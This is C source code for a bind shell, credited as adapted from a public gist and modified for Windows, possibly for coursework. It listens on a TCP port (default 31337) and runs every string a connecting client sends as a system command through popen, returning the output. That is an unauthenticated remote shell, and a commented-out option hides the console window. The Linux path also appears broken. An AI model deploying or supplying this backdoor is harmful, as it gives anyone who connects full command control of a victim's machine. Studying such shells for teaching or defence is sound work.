// Based on https://gist.github.com/hc0d3r/8154611
// Linux and Windows Bind server
// linux: gcc bind.c -o bind -Wall --> without any error output c;
// windows: gcc.exe nice2.c -o nice2.exe -lws2_32
// Changed by Xinwen Fu for Windows and may not work for Linux

#ifdef WIN32
	#include <winsock2.h>
	#pragma comment(lib,"ws2_32.lib")
#else
	#include <unistd.h>
	#include <netinet/in.h>
	#include <sys/socket.h>
	#include <sys/types.h>
	#define SOCKET_ERROR 0xFFFFFFFF
	#define INVALID_SOCKET 0xFFFFFFFF
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

DWORD WINAPI ConnectionHandler(LPVOID CSocket);


typedef struct {
    struct sockaddr_in addr; /* Client remote address */
    SOCKET connfd;              /* Connection file descriptor */
} client_t;

int main(int argc,char **argv){
	int port;
	SOCKET ClientSocket = INVALID_SOCKET;
	struct sockaddr_in ClientAddress;
	int Result;
	
	//Hide console
//	HWND hWnd = GetConsoleWindow();
//	ShowWindow(hWnd, SW_HIDE);
	
	(argv[1]) ? (port = atoi(argv[1])) : (port = 31337);
	printf("[+] Bind in the port %i\n",port);
	if(argc < 2){
		printf("[*] You can change this, run: %s <port-number>\n",argv[0]);
	}

	struct sockaddr_in server;

#ifdef WIN32
	WSADATA wsa;
	SOCKET con;

	if(WSAStartup(MAKEWORD(2,2),&wsa) != 0){
		printf("[-] Failed. Error number : %d",WSAGetLastError());
		exit(1);
	}
#else
	int con;
#endif

	printf("[+] Starting.\n");

	if((con = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET){
	#ifdef WIN32
		printf("[-] Fail to create socket, error number : %d" , WSAGetLastError());
	#else
		perror("[-] Fail to create socket");
	#endif
		exit(1);
	}

	printf("[+] Socket created\n");

#ifndef WIN32
	bzero(&server, sizeof(server));
#endif
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(port);
#ifndef WIN32
	bzero(&(server.sin_zero), 8);
#endif

	if(bind(con,(struct sockaddr *)&server , sizeof(server)) == SOCKET_ERROR){
	#ifdef WIN32
		printf("[-] Failed to bind, error number : %d" , WSAGetLastError());
	#else
		perror("[-] Failed to bind");
	#endif
		exit(1);
	}

	printf("[+] Bind Ok\n");

	Result=listen(con , 1);
	if (Result == SOCKET_ERROR) {
		printf("Listen failed with error: %d\n", WSAGetLastError());
		closesocket(con);
		WSACleanup();
		return 1;
	}	
	
	printf("[*] Waiting connection...\n");

	while(1) {
		ClientSocket = accept(con,(SOCKADDR*)&ClientAddress,0);
		if (ClientSocket == INVALID_SOCKET) {
			printf("Accept failed with error: %d\n", WSAGetLastError());
			break;
		} 
		
        client_t *cli = (client_t *)malloc(sizeof(client_t));
        cli->addr = ClientAddress;
        cli->connfd = ClientSocket;

		CreateThread(0,0,ConnectionHandler, (LPVOID)cli, 0,0);
		
	}
	
#ifdef WIN32
	closesocket(con);
	WSACleanup();
#else
	close(con);
#endif

	exit(0);
}

DWORD WINAPI ConnectionHandler(LPVOID cli) {
	int bytes,caracter;
	char mensagem[2],buffer[1024],*message,*welcome, *ps;
	FILE *command;
	client_t *pCli=(client_t * )cli;
	SOCKET con= pCli->connfd;

#ifdef WIN32
	welcome = "\n[+] Connected\ncmd> ";
	ps = "cmd> ";
#else
	welcome = "\n[+] Connected\n$ ";
	ps = "$ ";
#endif
	
	printf("\n[+] Connected !!!\n");

	send(con,welcome,strlen(welcome),0);

	memset(buffer,0,1024);

	while(1){
		bytes = recv(con,buffer,1024,0);
		if(bytes == -1) break;
		if (strncmp(buffer, "EXIT", 4) == 0) {
			break;
		}
		buffer[bytes] = '\0';

		if(strlen(buffer) > 0){
			command = popen(buffer,"r");
			while(1){
				caracter = fgetc(command);
				if(caracter == EOF) break;
					sprintf(mensagem,"%c",caracter);
					send(con,mensagem,1,0);
			}

			pclose(command);
		}

		send(con,ps,strlen(ps),0);
		memset(&buffer,0,1024);
		memset(&mensagem,0,2);
	}

	printf("[+] Disconnected\n");

#ifdef WIN32
	closesocket(con);
#else
	close(con);
#endif

	free(pCli);
	
}
